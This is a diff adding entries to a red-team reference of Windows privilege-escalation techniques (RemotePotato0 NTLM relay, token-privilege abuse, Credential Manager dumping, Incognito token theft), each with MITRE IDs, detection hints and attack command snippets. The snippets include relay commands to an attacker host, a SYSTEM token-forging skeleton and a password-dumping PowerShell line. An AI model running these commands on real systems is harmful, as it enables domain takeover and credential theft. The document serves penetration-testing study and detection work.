+      "description_md": "RemotePotato0 targets environments where a privileged user (e.g., Domain Admin) is logged in concurrently in another Windows session (e.g., Session 1 via RDP). The attacker, with SeImpersonatePrivilege in Session 0 (service context), marshals a DCOM activation request cross-session. This triggers the privileged user's NTLM credentials to authenticate to a local port, which are then forwarded (via `socat` or `ntlmrelayx`) to LDAP/LDAPS to add ACLs or create Domain Admin accounts.\n\n**Requirements**: Concurrent privileged user session; LDAP relay target (e.g., DC); `ntlmrelayx` on attacker machine.",
+      "difficulty": "red-team",
+      "mitre_attack_id": "T1134.001",
+      "detection_hints": "Alert on cross-session DCOM activation attempts. Monitor LDAP signing enforcement — enforcing LDAP signing/channel binding blocks the relay. Detect `ntlmrelayx` relay events.",
+      "tags": [
+        "potato",
+        "remote-potato",
+        "ntlm-relay",
+        "cross-session",
+        "domain-escalation",
+        "red-team"
+      ],
+      "prerequisites": [
+        "priv-se-impersonate"
+      ],
+      "related": [
+        "priv-dcom-potato"
+      ],
+      "snippets": [
+        {
+          "shell": "cmd",
+          "title": "RemotePotato0 cross-session coercion",
+          "code": "RemotePotato0.exe -m 2 -r 10.10.14.5 -x 10.10.14.5 -p 9999 -s 1",
+          "description": "Coerces session 1 (privileged user) to authenticate to attacker relay on 10.10.14.5:9999.",
+          "requires_admin": false
+        },
+        {
+          "shell": "bash",
+          "title": "ntlmrelayx listener on attacker (Kali)",
+          "code": "# Run on attacker machine before triggering coercion\npython3 ntlmrelayx.py -t ldap://10.10.10.5 --escalate-user svc_account",
+          "requires_admin": false
+        }
+      ],
+      "references": [
+        {
+          "title": "RemotePotato0 GitHub - antonioCoco",
+          "url": "https://github.com/antonioCoco/RemotePotato0",
+          "kind": "tool"
+        },
+        {
+          "title": "RemotePotato0 Blog Post - antonioCoco",
+          "url": "https://decoded.avast.io/janrubin/remotepotato0-another-unexpected-privilege-escalation-vulnerability/",
+          "kind": "blog"
+        }
+      ]
+    },
+    {
+      "id": "priv-se-assign-primary",
+      "kind": "technique",
+      "title": "SeAssignPrimaryTokenPrivilege Abuse",
+      "summary": "SeAssignPrimaryTokenPrivilege allows replacing a process's primary token; an attacker duplicates a SYSTEM token (obtained via handle leak or WMI) and spawns a child process running as SYSTEM.",
+      "severity": "high",
+      "parent_id": "priv-whoami-priv",
+      "description_md": "The `SeAssignPrimaryTokenPrivilege` privilege allows a process to call `AssignProcessToJobObject` and `CreateProcessAsUser` with an arbitrary primary token. When held alongside `SeIncreaseQuotaPrivilege` (commonly granted together on service accounts), an attacker can:\n1. Obtain a SYSTEM token handle (via `WTSQueryUserToken`, impersonation, or handle inheritance).\n2. Duplicate the token as a primary token (`DuplicateTokenEx` with `TokenPrimary`).\n3. Spawn a new process (`CreateProcessAsUserW`) using the duplicated SYSTEM token.\n\nCommonly present on IIS Application Pool identities, SQL Server service accounts, and other network service contexts.",
+      "difficulty": "oscp-advanced",
+      "mitre_attack_id": "T1134.002",
+      "detection_hints": "Audit `SeAssignPrimaryTokenPrivilege` grants (Event ID 4703). Alert on `CreateProcessAsUser` calls from low-privilege processes with unusual parent-child relationships.",
+      "tags": [
+        "token-manipulation",
+        "se-assign-primary",
+        "service-account",
+        "local-privilege-escalation"
+      ],
+      "prerequisites": [
+        "user-whoami-all"
+      ],
+      "related": [
+        "priv-se-impersonate",
+        "priv-sweet-potato"
+      ],
+      "snippets": [
+        {
+          "shell": "powershell",
+          "title": "Check SeAssignPrimaryTokenPrivilege",
+          "code": "whoami /priv | Select-String 'SeAssignPrimaryToken'",
+          "requires_admin": false
+        },
+        {
+          "shell": "cmd",
+          "title": "Exploit via JuicyPotatoNG (also handles SeAssignPrimaryToken)",
+          "code": "JuicyPotatoNG.exe -t * -p C:\\Windows\\System32\\cmd.exe -a \"/c whoami > C:\\Temp\\out.txt\"",
+          "description": "JuicyPotatoNG uses CreateProcessAsUser when SeAssignPrimaryToken is present.",
+          "requires_admin": false
+        }
+      ],
+      "references": [
+        {
+          "title": "MITRE ATT&CK T1134.002 - Create Process with Token",
+          "url": "https://attack.mitre.org/techniques/T1134/002/",
+          "kind": "mitre"
+        },
+        {
+          "title": "HackTricks - Token Manipulation Privileges",
+          "url": "https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens",
+          "kind": "hacktricks"
+        }
+      ]
+    },
+    {
+      "id": "priv-se-create-token",
+      "kind": "technique",
+      "title": "SeCreateTokenPrivilege Abuse",
+      "summary": "SeCreateTokenPrivilege permits constructing an arbitrary Windows access token via NtCreateToken, enabling an attacker to forge a SYSTEM or Domain Admin token from scratch.",
+      "severity": "critical",
+      "parent_id": "priv-whoami-priv",
+      "description_md": "With `SeCreateTokenPrivilege`, an attacker may call the native `NtCreateToken` syscall to synthesize a fully custom access token with any desired SIDs, groups, and privileges — including `NT AUTHORITY\\SYSTEM` or a Domain Admin SID. The forged token can then be used with `ImpersonateLoggedOnUser` or `CreateProcessWithTokenW` to run processes as the fabricated identity.\n\n**This is a rarely granted privilege** but may appear on highly privileged service accounts or legacy applications. Detection is difficult because the token is created legitimately via a kernel API.",
+      "difficulty": "red-team",
+      "mitre_attack_id": "T1134.003",
+      "detection_hints": "This privilege should never appear on non-SYSTEM accounts. Alert immediately on Event ID 4703 granting SeCreateTokenPrivilege. Hunt via `whoami /priv` output in EDR telemetry.",
+      "tags": [
+        "token-creation",
+        "se-create-token",
+        "forged-token",
+        "local-privilege-escalation",
+        "red-team"
+      ],
+      "prerequisites": [
+        "user-whoami-all"
+      ],
+      "related": [
+        "priv-se-assign-primary",
+        "priv-se-impersonate"
+      ],
+      "snippets": [
+        {
+          "shell": "powershell",
+          "title": "Check for SeCreateTokenPrivilege",
+          "code": "whoami /priv | Select-String 'SeCreateToken'",
+          "requires_admin": false
+        },
+        {
+          "shell": "c",
+          "title": "Skeleton NtCreateToken call (conceptual)",
+          "code": "// Requires SeCreateTokenPrivilege enabled in current process token\nNTSTATUS status = NtCreateToken(\n    &hToken,\n    TOKEN_ALL_ACCESS,\n    &objAttr,\n    TokenPrimary,\n    &AuthId,\n    &ExpirationTime,\n    &TokenUser,     // SID = NT AUTHORITY\\SYSTEM\n    &TokenGroups,   // Add BUILTIN\\Administrators\n    &TokenPrivileges,\n    NULL, NULL,\n    &TokenDefaultDacl,\n    &TokenSource\n);",
+          "description": "Conceptual C snippet; full PoC requires building SID/privilege structures.",
+          "requires_admin": false
+        }
+      ],
+      "references": [
+        {
+          "title": "MITRE ATT&CK T1134.003 - Make and Impersonate Token",
+          "url": "https://attack.mitre.org/techniques/T1134/003/",
+          "kind": "mitre"
+        },
+        {
+          "title": "HackTricks - SeCreateTokenPrivilege",
+          "url": "https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens#secreatetokenprivilege",
+          "kind": "hacktricks"
+        }
+      ]
+    },
+    {
+      "id": "priv-se-trusted-credman",
+      "kind": "technique",
+      "title": "SeTrustedCredManAccessPrivilege Abuse",
+      "summary": "SeTrustedCredManAccessPrivilege grants access to read the Windows Credential Manager store as a trusted caller, exposing plaintext credentials stored by other users on the machine.",
+      "severity": "high",
+      "parent_id": "priv-whoami-priv",
+      "description_md": "The `SeTrustedCredManAccessPrivilege` privilege is normally reserved for LSASS. A process holding this privilege can call `CredBackupCredentials` and `CredRestoreCredentials` as a trusted caller, bypassing the user-SID restriction that ordinarily limits Credential Manager access to the owning user. This allows dumping another logged-on user's stored credentials (web passwords, RDP credentials, domain credentials) without touching LSASS memory.\n\n**Typical context**: Found on certain backup agents or credential management services. Very rare but extremely impactful.",
+      "difficulty": "red-team",
+      "mitre_attack_id": "T1555.004",
+      "detection_hints": "Alert on Event ID 4703 granting SeTrustedCredManAccessPrivilege. Monitor `CredBackupCredentials` API usage from non-LSASS processes via ETW/EDR.",
+      "tags": [
+        "credential-access",
+        "credential-manager",
+        "se-trusted-credman",
+        "red-team"
+      ],
+      "prerequisites": [
+        "user-whoami-all"
+      ],
+      "related": [
+        "priv-se-backup"
+      ],
+      "snippets": [
+        {
+          "shell": "powershell",
+          "title": "Check privilege presence",
+          "code": "whoami /priv | Select-String 'SeTrustedCredManAccess'",
+          "requires_admin": false
+        },
+        {
+          "shell": "powershell",
+          "title": "Dump credentials using CredentialManager module",
+          "code": "# Impersonate target user session first, then dump\n$creds = [Windows.Security.Credentials.PasswordVault]::new()\n$creds.RetrieveAll() | ForEach-Object { $_.RetrievePassword(); $_ } | Select-Object UserName, Resource, Password",
+          "description": "Requires process running with SeTrustedCredManAccessPrivilege and impersonation of target user token.",
+          "requires_admin": false
+        }
+      ],
+      "references": [
+        {
+          "title": "MITRE ATT&CK T1555.004 - Windows Credential Manager",
+          "url": "https://attack.mitre.org/techniques/T1555/004/",
+          "kind": "mitre"
+        },
+        {
+          "title": "HackTricks - SeTrustedCredManAccessPrivilege",
+          "url": "https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens#setrustedcredmanaccessprivilege",
+          "kind": "hacktricks"
+        }
+      ]
+    },
+    {
+      "id": "priv-incognito-impersonate",
+      "kind": "tool",
+      "title": "Token Theft via Incognito / Token Impersonation",
+      "summary": "Incognito (Meterpreter module or standalone) lists and steals impersonation tokens from processes of higher-privileged users, enabling direct impersonation without exploiting a specific vulnerability.",
+      "severity": "high",
+      "parent_id": "priv-se-impersonate",
+      "description_md": "The `incognito` tool (originally by Luke Jennings, integrated into Meterpreter) enumerates all available delegation and impersonation tokens on the machine. With `SeImpersonatePrivilege`, the attacker can then impersonate any token, including SYSTEM or Domain Admin tokens left by logged-in users or services.\n\n**Workflow**:\n1. Get a session with SeImpersonatePrivilege (e.g., via service exploit).\n2. Load incognito and list tokens.\n3. Impersonate the desired token (e.g., `DOMAIN\\Administrator`).\n4. Execute commands or migrate to a process in the impersonated context.",
+      "difficulty": "oscp-basic",
+      "mitre_attack_id": "T1134.001",
+      "detection_hints": "Alert on `OpenProcessToken` + `DuplicateToken` API sequences from non-SYSTEM processes. Sysmon Event ID 10 (process access) across privilege boundaries.",
+      "tags": [
+        "incognito",
+        "token-impersonation",
+        "meterpreter",
+        "se-impersonate",
+        "oscp"
+      ],
+      "prerequisites": [
+        "priv-se-impersonate"
+      ],
+      "related": [
+        "priv-se-assign-primary",
+        "priv-sweet-potato"
+      ],
+      "snippets": [
+        {
+          "shell": "cmd",
+          "title": "Meterpreter incognito token listing",
+          "code": "# Inside meterpreter session:\nload incognito\nlist_tokens -u\nimpersonate_token \"NT AUTHORITY\\\\SYSTEM\"",
+          "description": "Load incognito module, list user tokens, impersonate SYSTEM or Domain Admin token.",
+          "requires_admin": false
+        },
+        {
+          "shell": "powershell",
+          "title": "Standalone incognito.exe token theft",
+          "code": "C:\\Temp\\incognito.exe list_tokens -u\nC:\\Temp\\incognito.exe execute -c \"NT AUTHORITY\\SYSTEM\" cmd.exe",
+          "requires_admin": false
+        }
+      ],
+      "references": [
+        {
+          "title": "Incognito Tool Documentation - ForegroundLabs",
+          "url": "https://labs.mwrinfosecurity.com/assets/BlogFiles/mwri-security-implications-of-windows-access-tokens-2008-04-14.pdf",
+          "kind": "paper"
+        },
+        {
+          "title": "HackTricks - Abusing Tokens",
+          "url": "https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens",
+          "kind": "hacktricks"
+        }
+      ]
+    }
+  ]
+}
